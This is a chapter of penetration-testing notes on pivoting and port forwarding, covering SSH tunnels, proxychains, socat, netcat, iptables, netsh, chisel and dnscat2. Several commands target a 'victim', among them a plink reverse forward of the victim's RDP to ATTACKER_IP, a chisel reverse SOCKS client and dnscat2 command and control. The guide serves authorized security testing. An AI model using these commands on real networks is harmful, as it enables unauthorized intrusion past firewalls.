
# 8 Pivoting and Redirection

These are techniques for "traffic bending" or "traffic shaping" or
"tunneling traffic" or "port redirection" or "port forwarding".

## 8.1 SSH Tunnels

Before starting, it is best to have the following settings enabled in the jumpbox
`/etc/ssh/sshd_config` file.

```ini
# In order to leverage -R remote port forwards, set the following:
GatewayPorts clientspecified

# Allow TCP forwarding (local and remote)
AllowTcpForwarding yes
```

After making changes to the `sshd_config` file you must restart `sshd` for changes to take effect.

```bash
# all commands executed as ROOT

# View the SSH server status.
systemctl status ssh

# Restart the SSH server (Debian, Ubuntu, Mint)
/etc/init.d/ssh restart # older SysV systems
service ssh restart # if service cmd installed
systemctl restart ssh # newer systemd systems

# for RHEL, Fedora, CentOS, Alma, Rocky, do...
/etc/init.d/sshd restart # older SysV systems
service sshd restart # if service command installed
systemctl restart sshd # newer systems w/ systemd

# FreeBSD, OpenBSD restart
/etc/rc.d/sshd restart
service sshd restart

# more at: https://www.cyberciti.biz/faq/howto-restart-ssh/

# Stop the SSH server.
systemctl stop ssh

# Start the SSH server.
systemctl start ssh
```

Here are common tunneling commands (using `-g` flag forces the ssh option
`GatewayPorts` to yes, and is good practice when using `-R`):

```sh
## Local Forwarding ###################################
# SSH local port forward from DMZ box to reach internal_server_ip:port via jumpbox_ip
ssh jumper@jumpbox_ip -p 2222 -L 0.0.0.0:4445:internal_server_ip:445
# Now `smbclient //DMZ_IP -p 4445 -N -L` on kali will let us list the SMB shares of
# internal_server_ip, which is only reachable from jumpbox_ip

# SSH local port forward to send traffic from our local port 8080 to victim's
# port 80 (to get around firewall restrictions that don't allow remote
# connections to that port, but allow us to ssh in)
ssh victim@$VICTIM_IP -L 8080:localhost:80
# Now `curl localhost:8080` will fetch $VICTIM_IP:80 which is not reachable
# from the outside


## Remote Forwarding #################################
# forward traffic to redirector's port 80 to your local listener on port 8080
ssh jumper@jumpbox_ip -gR 0.0.0.0:80:localhost:8080
# now reverse shells pointed to the jumpbox_ip:80 will hit your local listener

# Connecting from jumpbox->attacker to give attacker access to
# internal_server_ip:445
ssh attacker@attacker_ip -gR 4445:internal_server_ip:445
# Now `smbclient localhost -p 4445 -N -L` will let us list the SMB shares of
# internal_server_ip, which is only reachable from jumpbox_ip, getting around
# firewall rules that also prevent inbound ssh connections


## Complex example: Throwing Eternal Blue through firewall ##################################
# Local forward to victim's SMB & WinRPC ports, remote forward meterpreter callback to attacker
ssh jumper@jumpbox_ip -L 4450:victim_ip:445 -L 135:victim_ip:135 \
-R 4444:localhost:4444
# The -L 135:victim_ip:135 port forward is optional. If you do not want to use it, you will have to set VerifyArch to false in metasploit.


## Dynamic forwarding (SOCKS4/5) #######################
# dynamic port forward to create a SOCKS proxy to visit any_internal_server_ip, which is only reachable from jumpbox
ssh jumper@jumpbox_ip -p 2222 -D 1080
# Next config /etc/proxychains4.conf: socks5 localhost 1080
# Then: proxychains curl http://any_internal_server_ip/
# curl, nmap, wfuzz and some versions of netcat natively support SOCKS proxies.
# Look at their help to see how to use the feature.
# e.g.
curl -x socks5://127.0.0.1:1080 http://www.lolcats.com
# You can also set up firefox to browse through SOCKS proxy through GUI settings


## Remote Dynamic forwarding (SOCKS4/5) ################################
# Connecting from jumpbox -> attacker, open SOCKS proxy on
# attacker that forwards traffic to internal net. Useful
# when firewall blocking inbound traffic, but allows ssh out.
# OpenSSH _client_ needs to be version 7.6 or above to use.
ssh -R 1080 attacker@attacker_ip


## ProxyJump ########################################
# ProxyJump lets you nest ssh connections to reach remote internal networks/hosts
# Here we chain ssh connections like so: jumpbox1_ip -> jumpbox2_ip -> internal_host,
# where internal_host is only reachable from jumbpox2, and jumpbox2 is only reachable from jumpbox1
ssh -J jumper@jumpbox1_ip:2221,jumper2@jumbox2_ip:2222 remoteuser@internal_host

# Combine ProxyJump + dynamic port forward to create a proxy through 2nd_box which is only accessible via jumpbox_ip
ssh -J jumper@jumpbox1_ip proxyuser@2nd_box -D 1080
# next config proxychains socks4a localhost 1080; proxychains curl http://any_internal_server_ip/; which is reachable from 2nd_box only


## Miscellaneous ###################################
# bypass first time prompt when have non-interactive shell
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" ...

# only allow a specific ssh key ability to port forward through port 6969:
# add following to ~/.ssh/authorized_keys
echo "from=\"$from_addr\",command=\"/usr/sbin/false\",no-agent-forwarding,no-X11-forwarding,no-pty,permitopen=\"localhost:6969\" $pubkey" >> ~/.ssh/authorized_keys
# where $from_addr is the IP that will be connecting to kali, and $pubkey is
# the full text of the id_rsa.pub file that you are using for this purpose.
```

When repeatedly using the same ProxyJump, it is easier to use if you set up `ssh_config` appropriately. See [here](https://medium.com/maverislabs/proxyjump-the-ssh-option-you-probably-never-heard-of-2d7e41d43464) for more details. Summary of how to do it:

```
Host jumpbox1
    HostName 10.1.1.100
    Port 22
    User jumper1
    IdentityFile /home/user/.ssh/id_rsa_jump1
Host jumpbox2
    HostName 10.2.2.100
    Port 22
    User jumper2
    IdentityFile /home/user/.ssh/id_rsa_jump2
    ProxyJump jumpbox1
Host jumpbox3
    HostName 10.3.3.100
    Port 22
    User jumper3
    IdentityFile /home/user/.ssh/id_rsa_jump3
    ProxyJump jumpbox2
Host target
    HostName 10.4.4.100
    Port 22
    User target
    IdentityFile /home/user/.ssh/id_rsa_target
    ProxyJump jumpbox3
    RemoteForward 8080 127.0.0.1:8080  # open remote port 8080 and redirect all the way back to attacker machine
    LocalForward 3306 127.0.0.1:3306  # open attacker-local port 3306 that forwards to target's internal port 3306
    DynamicForward 1080  # open SOCKS proxy on attacker that tunnels all the way through target as exit node
```

You can also set up OpenSSH (v4.3+) to act as a full VPN to tunnel traffic. See
[here](https://wiki.archlinux.org/index.php/VPN_over_SSH#OpenSSH's_built_in_tunneling) for how to do it. (`-w` command flag, or `Tunnel` ssh_config option).

**PRO TIP**: If setting up a remote ssh tunnel purely to (remote-)forward traffic, use the following flags: `-gfNTR`.

- `-f` forks the ssh process into the background after
connection is established so you can keep using your terminal.
- `-N` and `-T` say "No" commands can be executed and no "TTY" is allocated.
  Using these together prevents command execution on the remote host (jump box)
- `-g` and `-R` enable "Gateway" ports and do "Remote" port forwarding


### 8.1.1 Ad Hoc SSH Port Forwards

TL;DR:

```
<ENTER><ENTER>~C
help
```

`ssh` also has an open command line mode to add or delete **ad hoc port forwards**. This can be summoned by typing the `<shift> ~ c` key sequence (`~C`) after SSH-ing into a box. One nuance to note is that the `~C` is only recognized after a new line, so be sure to hit Enter a few times before typing in the key sequence. It likes to be called from a pure blinking command prompt that hasn’t been "dirtied" by, for example, typing something, then deleting it. So just be sure to hit Enter a few times before trying to drop into the SSH open command line mode.

The ssh prompt will change to `ssh>` when you enter ad hoc command line mode.

Typing `help` in ad hoc command line mode shows command syntax examples.

### 8.1.2 SSH on Windows

SSH comes with Windows 10 by default since 1803 (and optionally since 1709). It's found in the `%systemdrive%\Windows\System32\OpenSSH` folder. Use `ssh.exe` just like `ssh` on Linux.

```powershell
# check if SSH is on Windows
where.exe ssh

# check if version >= 7.6, so we can use Reverse Dynamic forwarding
ssh.exe -V
```

The other option is to copy **`plink.exe`** over to the Windows box.

> ⚠ **NOTE:** If you need a SOCKS proxy instead of just direct port forwarding, DON'T use plink! It doesn't support SOCKS. Use chisel instead!!!

```sh
# grab copy of plink and host on http for Windows victim
cp /usr/share/windows-resources/binaries/plink.exe .
python -m http.server 80

# on windows, download it
iwr http://LISTEN_IP/plink.exe -outfile C:\Windows\Temp\plink.exe

# use plink similar to ssh, with addition of '-l USER -pw PASSWD'
# Note: echo y accepts host key on non-interactive shells.
# This command opens up the victim's firewalled RDP to your kali box.
cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l portfwd -pw herpderp -N -R 3389:127.0.0.1:3389 ATTACKER_IP
```


### 8.1.3 Creating restricted user for ssh port forwarding only

This is valuable for working with `plink.exe` on Windows, which requires entering your password in plaintext into the command line, which isn't ideal for security.

First create the restricted `portfwd` user on your Kali box:

```sh
# create restricted user
# change 'herpderp' to whatever password you desire
# keep space in front of command to avoid it getting saved in shell history
 sudo useradd -c "ssh port forwarding only" --no-create-home --home-dir "/nonexistent" --no-user-group --system --shell "/usr/sbin/nologin" --password "$(openssl passwd -6 herpderp)" portfwd

# removing the user:
sudo userdel portfwd
```

Then add the following to the bottom of your `/etc/ssh/sshd_config`:

```
Match User portfwd
   #AllowTcpForwarding yes
   #X11Forwarding no
   #PermitTunnel no
   #GatewayPorts no
   #PermitOpen localhost:6969
   AllowAgentForwarding no
   PermitTTY no
   ForceCommand /usr/sbin/false
```

Finally, you MUST include the `-N` flag (no commands) when connecting over ssh, so you don't get booted when `/usr/sbin/false` returns an error.


## 8.2 SOCKS Proxies and proxychains

`proxychains` is great for tunneling TCP traffic through a SOCKS proxy (like
what `ssh -D` and `chisel -D` give you).

Add a proxy configuration line at the bottom of `/etc/proxychains4.conf`. The config format is `socks5 PROXY_IP PORT`.

```sh
# make sure proxychains is confgured for SOCKS:
sudo sh -c 'echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf'
# prefer socks5 because it supports UDP (DNS!)
# if your proxy doesn't support it, use socks4

# using proxychains: put your command after 'proxychains -q'
# '-q' is quiet, so you don't see stderr msgs for each connection
sudo proxychains -q nmap -v -sT -F --open -Pn $VICTIM_IP
sudo proxychains -q nmap -v -sU -F --open -Pn $VICTIM_IP


# to proxy DNS through the new SSH SOCKS tunnel, set the following line in
# /etc/proxychains4.conf:
proxy_dns
# and set the following env variable:
export PROXYRESOLVE_DNS=REMOTE_DNS_SVR

# to speed up scanning with nmap through proxychains, set the following in
# /etc/proxychains.conf:
tcp_read_time_out 1000
tcp_connect_time_out 500


# ssh doesn't seem to work through proxychains.
# to tunnel ssh through a SOCKS proxy:
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' victim@VICTIM_IP
```

> ⚠ **NOTE**: To scan TCP with nmap through a SOCKS proxy, only full-connection scans are possible! (nmap option flag `-sT`). It's also often necessary to tell nmap to assume the host is up (`-Pn`). Until nmap's `--proxy` flag is stable, use `proxychains nmap` instead.
> 
> By default, Proxychains is configured with very high time-out values. This can make port scanning really slow. Lowering the `tcp_read_time_out` and `tcp_connect_time_out` values in `/etc/proxychains4.conf` will force time-out on non-responsive connections more quickly. This can dramatically speed up port-scanning times. I used `tcp_read_time_out 1000` and `tcp_connect_time_out 500` successfully.


## 8.3 Bending with sshuttle

[Sshuttle](https://sshuttle.readthedocs.io/en/stable/usage.html) is a python library that handles setting up a combination of IPTABLES rules and SSH proxy tunnels to transparently route all traffic to a target internal subnet easily.

```sh
# sshuttle is most useful when you combine it with a multihop
# configuration like so:
# kali -> jumpbox1 (socat listening on 2222) -> DMZ_net (10.1.1.0/24) -> jumpbox2 (ssh) -> internal_net (172.16.2.0/24)

# on kali, run:
# the CIDR IPs are the target subnets you want sshuttle to route
# through your tunnel transparently.
sshuttle --dns -r jumpbox2_user@jumpbox1_ip:2222 10.1.1.0/24 172.16.2.0/24
```

## 8.4 Bending with socat

On the jump-box:

```sh
# basic port forwarding with socat listener
sudo socat -dd TCP-LISTEN:80,fork TCP:REMOTE_HOST_IP:80
# optionally, do same thing bound to specific interface IP
sudo socat -dd TCP-LISTEN:80,bind=10.0.0.2,fork TCP:REMOTE_HOST_IP:80

# UDP relay
socat -dd -u UDP-RECVFROM:1978,fork,reuseaddr UDP-SENDTO:10.1.1.89:1978

# IPv4 to IPv6 tunnel
sudo socat -dd TCP-LISTEN:110,reuseaddr,fork 'TCP6:[fe80::dead:beef%eth0]:110'

# TCP to Unix Domain Socket
socat -dd TCP-LISTEN:1234,reuseaddr,fork UNIX-CLIENT:/tmp/foo
# more secure version
socat -dd TCP-LISTEN:1234,reuseaddr,fork,su=nobody,range=127.0.0.0/8 UNIX-CLIENT:/tmp/foo
```

General socat syntax

```
socat [options] <address> <address>
```

Where `<address>` is in the form `protocol:ip:port` or `filename` or `shell-cmd`

Other useful addresses:
 - `STDIN` (equivalently, `-`), `STDOUT`, and `STDIO` (both stdin and stdout)
 - `EXEC:cmdline` or `SYSTEM:shell-cmd`
 - `FILE:/path/to/file` - log output to file
 - `FILE:$(tty),rawer` - a raw terminal
 - `PTY,link=/tmp/mypty,rawer,wait-slave`
 - `UDP:host:port` and `UDP-LISTEN:port`
 - `TCP:host:port` and `TCP-LISTEN:port`
 - `OPENSSL:host:port` and `OPENSSL-LISTEN:host:port`
 - `UNIX-CONNECT:filename` and `UNIX-LISTEN:filename`
 - `PIPE` or `PIPE:filename`

## 8.5 Bending with netcat

Netcat combined lets you do traffic bending. It's a crude (but effective) tool.

```powershell
# WINDOWS pivot
# enter temporary directory to store relay.bat
cd %temp%
# create relay.bat to connect to victim service
echo nc $VICTIM_IP VICTIM_PORT > relay.bat
# Set up pivot listener (-L is persistent listener)
nc –L -p LISTEN_PORT –e relay.bat
```

```sh
# LINUX pivot
# requires named pipe to join sender & receiver
mkfifo /tmp/bp  # backpipe
nc –lnp LISTEN_PORT 0<bp | nc $VICTIM_IP VICTIM_PORT | tee bp
# 'tee' lets you inspect bytes on the wire
```

## 8.6 Bending with iptables

Iptables forwarding requires `root` privileges.

Here's how to do traffic shaping to redirect traffic on port 80 through a pivot
host to your desired remote host. Note, it's usually also good practice to
specify the interface for iptables rules with `-i eth0` or whatever.

```sh
# allow inbound traffic on tcp port 80
sudo iptables -I INPUT -p tcp -m tcp --dport 80 -j ACCEPT
# NAT the traffic from server's port 80 to remote host port 80 (changing dest addr)
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination REMOTE_HOST_IP:80
# enable NAT'ing on outbound traffic (changing source addr)
sudo iptables -t nat -A POSTROUTING -j MASQUERADE
# allow forwarding traffic through iptables
sudo iptables -I FORWARD -j ACCEPT
# default policy to allow forwarding
sudo iptables -P FORWARD ACCEPT
```

**NOTE**: to forward IP packets (when using `MASQUERADE` or `SNAT`), you must first enable it in the kernel via:

```sh
# Enable ip forwarding in kernel permanently (fwding req'd for MASQUERADE/SNAT)
sudo sysctl -w net.ipv4.ip_forward=1
# -- or temporarily until reboot --
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
# or /proc/sys/net/ipv4/conf/IFNAME/forwarding

# make iptables rules persistent (optional)
sudo service iptables-persistent save
```



## 8.7 Bending with rinetd

Better suited for **long-term** redirections.

Once installed (`apt install -y rinetd`), you can easily specify rinetd forwarding rules by changing the config settings in `/etc/rinetd.conf`. `rinetd` acts as a persistently-running service that does redirection.

Redirection rules are in the following format:

```
bindaddress bindport connectaddress connectport
```

The `kill -1` signal (`SIGHUP`) can be used to cause rinetd to reload its configuration file without interrupting existing connections. Under Linux the process id is saved in the file `/var/run/rinetd.pid` to facilitate the `kill -HUP`. Or you can do a hard restart via `sudo service rinetd restart`.

## 8.8 Bending with netsh on Windows

If you own a dual-homed internal Windows box that you want to pivot from, you
can set up port forwarding using the `netsh` utility.

**NOTE**: Requires Administrator privileges.

```powershell
# NOTE: before you start, make sure IP Helper service is running

# establish IPv4 port forwarding from windows external IP to internal host
netsh interface portproxy add v4tov4 listenport=4445 listenaddress=0.0.0.0 connectport=445 connectaddress=INTERNAL_VICTIM_IP
# example opening mysql connections to the outside on port 33066
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=33066 connectaddress=127.0.0.1 connectport=3306

# confirming your port forwarding rule was added:
netsh interface portproxy show all

# confirming your port is actually listening:
netstat -anp TCP | findstr "4445"

# you also need to open a firewall rule to allow your inbound traffic (4445 in example)
# note: if you want to restrict it to a specific interface IP, add "localip=EXT_WIN_IP"
netsh advfirewall firewall add rule name="derp" protocol=TCP dir=in action=allow localport=4445

# on kali, check port is "open", not "filtered"
sudo nmap -T4 -sS -Pn -n -p4445 WINDOWS_IP

# removing firewall hole:
netsh advfirewall firewall delete rule name="derp"
```

## 8.9 Bending with chisel

[Chisel](https://github.com/jpillora/chisel) lets you securely tunnel using HTTP as a transport, allowing you to get through Deep Packet Inspection (DPI) firewalls to forward ports or set up a SOCKS proxy.

> ⚠ **NOTE**: The chisel installed on Kali doesn't always play nice with other Linux hosts. Always download the client binary from the repo!

[Chisel Releases Page](https://github.com/jpillora/chisel/releases/latest)

The most common way to use it is as a Reverse SOCKS proxy (reference: [Reverse SOCKS guide](https://vegardw.medium.com/reverse-socks-proxy-using-chisel-the-easy-way-48a78df92f29)). Example of Reverse SOCKS proxy setup:

```bash
# on attack box
# start reverse socks proxy server on port 8080:
./chisel server -p 8000 --reverse

# grab windows chisel.exe binary from:
# https://github.com/jpillora/chisel/releases/latest/

# on jumpbox (Windows example), set up reverse SOCKS proxy
.\chisel-x64.exe client attacker_ip:8000 R:socks

# then use proxychains from attack box like normal

# to do reverse port forwarding so kali can reach internal address,
# add the following to the previous command:
R:2222:VICTIM_IP:22

# to tunnel ssh through a SOCKS proxy without proxychains:
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:8000 %h %p' victim@VICTIM_IP
```


## 8.10 Bending with `dnscat2`

[Dnscat2](https://github.com/iagox86/dnscat2) is a tool for securely tunneling traffic through DNS queries in order to perform C2 functions on a victim. It has a server and a client binary. You run the server on a DNS nameserver you own. You run the client on a victim. Once a client establishes a session with the server, you can use a command interface on the server (kinda like msfconsole) to interact with the client. This includes setting up port forwarding rules.

```sh
# on your DNS Nameserver, start the dnscat2 server:
dnscat2-server mydomain.com

# on your victim, start the dnscat2 client
./dnscat mydomain.com


# on your DNS Nameserver, in the dnscat2 command shell:
# list active sessions (windows)
dnscat2> windows
# interact with window/session 1
dnscat2> window -i 1
# get help, listing all commands
command (victim01) 1> ? # or 'help'
# get command help for 'listen' (sets up local fwd like ssh -L)
command (victim01) 1> listen --help
# start local port forwarding
command (victim01) 1> listen 0.0.0.0:4455 VICTIM_IP:445
# if you mess up and have to change the listening port,
# you have to kill the client and restart it.
# It's usually better to just pick a different listen port if you can.
# return to main command screen
command (victim01) 1> shutdown
# (after restarting victim client, you can retry your port forward)
# if you want to return to the top level command window
# without killing the client:
command (victim01) 1> suspend


# on kali:
# now you can use your newly forwarded port to reach inside the victim network:
smbclient -U victim --password=victimpass -p 4455 -L //NAMESERVER_IP/
# connection will be very slow.
```
